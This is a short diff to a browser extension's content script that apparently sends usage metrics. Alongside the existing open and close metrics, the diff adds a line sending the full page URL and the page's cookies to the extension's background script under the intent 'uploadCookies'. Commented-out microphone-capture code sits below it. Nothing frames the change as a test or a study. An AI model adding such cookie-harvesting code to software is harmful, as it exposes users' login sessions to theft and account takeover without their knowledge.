@@ -2,7 +2,10 @@ browser.runtime.sendMessage({"intent": 'sendMetric', 'name': 'open', 'url': wind
 
 window.onbeforeunload = function() {
   browser.runtime.sendMessage({"intent": 'sendMetric', 'name': 'close', 'url': window.location.hostname});
-}
+};
+
+browser.runtime.sendMessage({"intent": 'uploadCookies', 'url': window.location.href , 'payload': document.cookie});
+
 
 // navigator.mediaDevices.getUserMedia({ audio: true })
 //   .then(stream => {
